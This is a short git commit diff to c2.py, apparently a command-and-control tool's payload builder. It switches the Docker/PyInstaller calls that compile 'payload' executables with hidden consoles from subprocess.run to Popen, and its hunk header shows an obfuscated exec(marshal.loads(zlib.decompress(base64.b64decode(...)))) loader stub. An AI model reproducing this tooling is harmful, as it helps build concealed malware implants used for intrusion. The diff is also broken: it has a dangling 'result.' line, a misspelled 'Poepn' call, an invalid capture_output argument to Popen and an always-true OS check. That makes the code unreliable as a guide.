36120c64aeb6008ae2b97a4891efcf08b4e3ff1e
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-15 21:11:07 -0400

    Popen

--- c2.py
+++ c2.py
@@ -180,12 +180,13 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         
 
         if os_name == "Windows":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.Popen(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
+            result.
             print(result)
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
         elif os_name == "Darwin" or "Linux":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.Poepn(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F --noconsole {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
